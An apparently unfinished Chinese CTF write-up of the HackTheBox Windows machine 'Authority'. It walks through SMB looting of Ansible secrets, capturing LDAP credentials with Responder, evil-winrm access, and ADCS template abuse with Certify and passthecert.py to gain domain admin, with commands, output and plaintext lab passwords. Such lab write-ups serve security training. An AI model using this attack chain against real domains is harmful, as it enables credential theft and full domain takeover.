**Waiting for machine retire...**

---

## Summary

*`OS: Windows` `Difficulty: Medium`*

xxx

### Attack Path Overview

![attack-path](./AttackPath/HTB-template.png){ width='450' }


## 扫描

自用扫描脚本：[工作流](https://github.com/TimeLess613/workflow-scan4HTB/blob/main/workflow-scan4HTB.sh)

开放端口：
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-17 09:52:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp  open  ssl/https-alt
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
52705/tcp open  msrpc         Microsoft Windows RPC
```


## 攻击路径规划·漏洞分析

Windows靶机，开了53、88等端口所以应该是域控——其实一台Windows靶机的话也只能是域控了吧，不然也没啥打的了。  
一共扫出29个开放端口，稍微分一下类然后按照优先度排一下：

1. SMB：139，445
1. HTTP/S：80，（8443）
1. LDAP：389，636，（3268，3269）
1. RPC：135，（593）
1. 域控相关：53，88，（464）
1. 有一些不太熟悉：464，593，3268，3269，5985，8443，9389
    - 464：Kerberos进行密码重设的端口
    - 593：原来ncacn_http是RPC的一个协议序列 [RPC over HTTP](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc#identifying-exposed-rpc-services)
    - 5985：后知后觉……这个不是WinRM的端口嘛
    - 3268，3269：似乎是用于全局目录（Global Catalog）的查询。 *全局目录是Active Directory中的一个功能，它包含了所有域的一部分通用属性信息，方便在跨域查询时快速访问这些信息*
    - 8443：搜索“ssl/https-alt”发现[这个讨论](https://stackoverflow.com/questions/61760786/what-is-the-use-of-port-8443)。那么8443应该也算web？ *"alt" 是 "alternative"（替代）的简写形式*
    - 9389：不太懂，姑且搜到[MS文档](https://learn.microsoft.com/en-us/openspecs/windows_protocols/mc-nmf/0aab922d-8023-48bb-8ba2-c4d3404cc69d)
1. 高位动态端口：似乎基本都是RPC相关

关于立足的预想路径：SMB——>WEB (——>LDAP——>RPC)  
SMB探索的东西应该不多，先看看这个收集一些信息。然后可以看看web端是否有突破口。LDAP和RPC经验不足，感觉如果web能突破可能就不需要后面了。web无法突破的话可能有域凭据然后枚举LDAP？


## SMB探索


### Development共享的文件分析

里面是ansible的几个项目？正好自己有了解一点ansible。  
文件似乎有点多，我一般都习惯从少的开始看，可以先看完一个没啥用的话就丢弃，然后专注剩下的文件多的东西。

#### SHARE

看了眼没啥有用的信息。

#### PWN




#### LDAP

#### ADCS



### ansible

#### 尝试搭建ansible控制端发放命令执行

由于发现ansible的清单文件，里面包含了ansible执行时的账户密码，于是尝试能否搭建ansible控制端连接靶机，并让其执行反弹shell。



##### python3.9的ansible运行结果
```bash
└─$ ansible -i ansible_inventory.yml -m win_ping HTB 
10.10.11.222 | UNREACHABLE! => {
    "changed": false,
    "msg": "ntlm: the specified credentials were rejected by the server",
    "unreachable": true
}
```

拒绝NTLM认证？难道是兔子洞？？

### 破解vault

对于前面发现的3个vault加密，看看john能否破解。


暂时不知道这些凭据在哪里使用，继续进行探索。


## 80端口

IIS的默认界面，没发现其他什么有用的信息。


## 8443端口

访问 `10.10.11.222:8443`，会报错需要TLS。那么试试 `https://10.10.11.222:8443`，会重定向到 `https://10.10.11.222:8443/pwm/private/login`。

![HTB-Authority-8443](./evidence-img/HTB-Authority-8443.png)

尝试前面的凭据，都报错。

然后点击下面的按钮，只需要密码。像是要ldap的，而前面有个密码正好不知道用户名，想着可能就是这里用，但是结果登陆失败。不过注意到页面下方的认证记录？有写用户名是 `svc_pwm`，那么看来是该用前面破解的 `svc_pwm`:`pWm_@dm!N_!23` 这组凭据。其实所有凭据都试一遍最终也可以登入。

![HTB-Authority-8443-loginError](./evidence-img/HTB-Authority-8443-loginError.png)


尝试输入密码，成功登入


![HTB-Authority-8443-logined](./evidence-img/HTB-Authority-8443-logined.png)


## Initial Access

可以在WARN看到LDAP 服务器 `ldaps://authority.authority.htb:636`，


![HTB-Authority-8443-ldap-setting](./evidence-img/HTB-Authority-8443-ldap-setting.png)

执行`sudo responder -I tun0 -v`，然后点击 `Test LDAP Profile`，可以收到明文密码：



```bash
┌──(venv-ansible)─(kali㉿kali)-[~/HTB/Authority]
└─$ evil-winrm -i 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r!
（略）
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami
htb\svc_ldap

*Evil-WinRM* PS C:\Users\svc_ldap\Downloads> whoami /all

USER INFORMATION
----------------

User Name    SID
============ =============================================
htb\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

- 值得注意的是，这个用户有 `SeMachineAccountPrivilege     Add workstations to domain` 权限，即可以将新机器加入域。


## flag: user

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> dir


    Directory: C:\Users\svc_ldap\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/20/2023  10:09 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> cat user.txt
1ef3（略）6483
```


## Privilege Escalation

### 探索

因为之前在SMB发现ansible里有ADCS文件夹，而在靶机C盘也发现名为 `Certs` 的目录，应该可以使用 `certify` 工具搜索易受攻击的证书。

```powershell
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/23/2023   6:16 PM                Certs
d-----        3/28/2023   1:59 PM                Department Shares
d-----        3/17/2023   9:20 AM                Development
d-----         8/9/2022   7:00 PM                inetpub
d-----        3/24/2023   8:22 PM                PerfLogs
d-r---        3/25/2023   1:20 AM                Program Files
d-----        3/25/2023   1:19 AM                Program Files (x86)
d-----        7/20/2023  11:52 AM                pwm
d-r---        3/24/2023  11:27 PM                Users
d-----        7/12/2023   1:19 PM                Windows
-a----        8/10/2022   8:44 PM       84784749 pwm-onejar-2.0.3.jar

*Evil-WinRM* PS C:\Certs> dir


    Directory: C:\Certs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/23/2023   6:11 PM           4933 LDAPs.pfx
```

### CA模板漏洞

在xxxxxxxxxxx下载 `Certify.exe` 后上传到目标机。
```powershell
*Evil-WinRM* PS C:\Users\svc_ldap\Downloads> wget 10.10.14.106:80/Certify.exe -OutFile Certify.exe
*Evil-WinRM* PS C:\Users\svc_ldap\Downloads> dir


    Directory: C:\Users\svc_ldap\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/20/2023  12:18 PM         174080 Certify.exe
```


运行命令后发现一个名为 `CorpVPN` 的漏洞模板：
```powershell

*Evil-WinRM* PS C:\Users\svc_ldap\Downloads> ./Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=authority,DC=htb'

[*] Listing info about the Enterprise CA 'AUTHORITY-CA'

    Enterprise CA Name            : AUTHORITY-CA
    DNS Hostname                  : authority.authority.htb
    FullName                      : authority.authority.htb\AUTHORITY-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Cert Start Date               : 4/23/2023 9:46:26 PM
    Cert End Date                 : 4/23/2123 9:56:25 PM
    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
      Allow  ManageCA, ManageCertificates               HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : authority.authority.htb\AUTHORITY-CA
    Template Name                         : CorpVPN
    Schema Version                        : 2
    Validity Period                       : 20 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
      Object Control Permissions
        Owner                       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
        WriteOwner Principals       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteDacl Principals        : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteProperty Principals    : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519



Certify completed in 00:00:09.7458664
```


#### certipy


```bash
┌──(kali㉿kali)-[~/HTB/Authority]
└─$ wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py

┌──(kali㉿kali)-[~/HTB/Authority]
└─$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands

# add_user_to_group svc_ldap Administrators
Adding user: svc_ldap to group Administrators result: OK





*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /all

USER INFORMATION
----------------

User Name    SID
============ =============================================
htb\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```






## flag: root

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/22/2023   3:53 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
c714（略）58d9
```



---

## 总结·后记

2023/07/22

……